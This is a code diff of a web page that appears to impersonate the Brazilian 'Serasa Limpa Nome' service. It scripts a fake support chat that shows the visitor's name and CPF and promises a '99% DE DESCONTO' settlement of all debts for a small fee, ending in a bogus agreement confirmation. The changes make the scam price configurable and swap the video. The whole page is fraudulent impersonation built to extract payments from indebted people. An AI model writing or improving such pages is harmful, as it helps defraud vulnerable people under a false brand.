@@ -123,6 +123,7 @@ footer small{color:#ffd1e8;font-size:11px}
 
 <footer><div class="g2">Serasa Limpa Nome</div><small>Canal oficial de negociação · Seus dados estão protegidos.</small></footer>
 
+<script src="../js/config.js?v=4"></script>
 <script src="../js/track.js"></script>
 <script>
 // esconde imagens remotas quebradas em vez de exibir ícone quebrado
@@ -151,6 +152,8 @@ document.getElementById('hi-greeting').textContent='Olá, '+titleFirst(first)+'!
 document.getElementById('first-ini').textContent=(first.charAt(0)||'?');
 document.getElementById('cpf-mask').textContent='CPF: '+(cpfRaw?String(cpfRaw).replace(/\D/g,'').slice(0,3)+'.*******':'...');
 var ACORDO=(window.SR_CONFIG&&window.SR_CONFIG.ACORDO_CODE)||'X1KAL-10S--';
+var acordoValor=(window.SR_CONFIG&&window.SR_CONFIG.getAcordoAmount)?window.SR_CONFIG.getAcordoAmount(false):66.38;
+var acordoValorTxt=(window.SR_CONFIG&&window.SR_CONFIG.fmtAcordoPrice)?window.SR_CONFIG.fmtAcordoPrice(acordoValor):('R$ '+Number(acordoValor).toFixed(2).replace('.',','));
 var VIDEO_WAIT=19000;
 var chat=document.getElementById('chat');
 function scrollDown(){window.scrollTo({top:document.body.scrollHeight,behavior:'smooth'});}
@@ -176,7 +179,7 @@ function stepVideo(){
     setTimeout(function(){
       t.remove();
       var row=document.createElement('div');row.className='msg-row';
-      row.innerHTML='<img class="av" src="'+AV+'"/><div class="video-bubble"><video id="att-video" src="../video/video-sr.mp4" playsinline preload="auto" disablepictureinpicture></video><button class="play-overlay" id="play-btn" aria-label="Ativar som"><svg width="22" height="22" viewBox="0 0 24 24"><path d="M8 5v14l11-7z"/></svg></button></div>';
+      row.innerHTML='<img class="av" src="'+AV+'"/><div class="video-bubble"><video id="att-video" src="../video/video-atendimento.mp4" playsinline preload="auto" disablepictureinpicture></video><button class="play-overlay" id="play-btn" aria-label="Ativar som"><svg width="22" height="22" viewBox="0 0 24 24"><path d="M8 5v14l11-7z"/></svg></button></div>';
       chat.appendChild(row);scrollDown();
       var v=row.querySelector('video'),b=row.querySelector('#play-btn');
       v.loop=false;
@@ -401,7 +404,7 @@ function stepVideo(){
                                       await step('<i>Acessando o acordo '+ACORDO+'...</i>');
                                       await step('Informações do acordo <b><i>'+ACORDO+'</i></b> para ('+full+')<br><br>(CPF: '+fmtCpf(cpfRaw)+')');
                                       await step('O contrato atual é válido apenas para o titular: <b>'+full+'</b> portador(a) do CPF: <b>'+fmtCpf(cpfRaw)+'</b>');
-                                      await step('Você gostaria de realizar o seu acordo com <b>99% DE DESCONTO</b> para quitar <b>todas</b> as suas dívidas e ter seu nome limpo novamente por apenas <b>R$ 66,38?</b>');
+                                      await step('Você gostaria de realizar o seu acordo com <b>99% DE DESCONTO</b> para quitar <b>todas</b> as suas dívidas e ter seu nome limpo novamente por apenas <b>'+acordoValorTxt+'?</b>');
                                       await new Promise(function(res){
                                         var t=showTyping();
                                         setTimeout(function(){
@@ -486,7 +489,7 @@ function stepVideo(){
                                                         setTimeout(function(){
                                                           t.remove();
                                                           var row=document.createElement('div');row.className='msg-row';
-                                                          row.innerHTML='<img class="av" src="'+AV+'"/><div class="status-box"><div class="lbl">Acordo confirmado: '+ACORDO+'!</div><div class="lbl">Beneficiário(a):</div><div class="neg">'+full+'</div><div class="lbl">Identificação (CPF):</div><div class="neg">'+fmtCpf(cpfRaw)+'</div><div class="cpf">Quitação de todas as dívidas em ativo no CPF.</div><div class="neg">895 Pontos no score.</div><div class="lbl">Valor da proposta: R$ 66,38</div></div>';
+                                                          row.innerHTML='<img class="av" src="'+AV+'"/><div class="status-box"><div class="lbl">Acordo confirmado: '+ACORDO+'!</div><div class="lbl">Beneficiário(a):</div><div class="neg">'+full+'</div><div class="lbl">Identificação (CPF):</div><div class="neg">'+fmtCpf(cpfRaw)+'</div><div class="cpf">Quitação de todas as dívidas em ativo no CPF.</div><div class="neg">895 Pontos no score.</div><div class="lbl">Valor da proposta: '+acordoValorTxt+'</div></div>';
                                                           chat.appendChild(row);scrollDown();
                                                           setTimeout(res,400);
                                                         },3000);
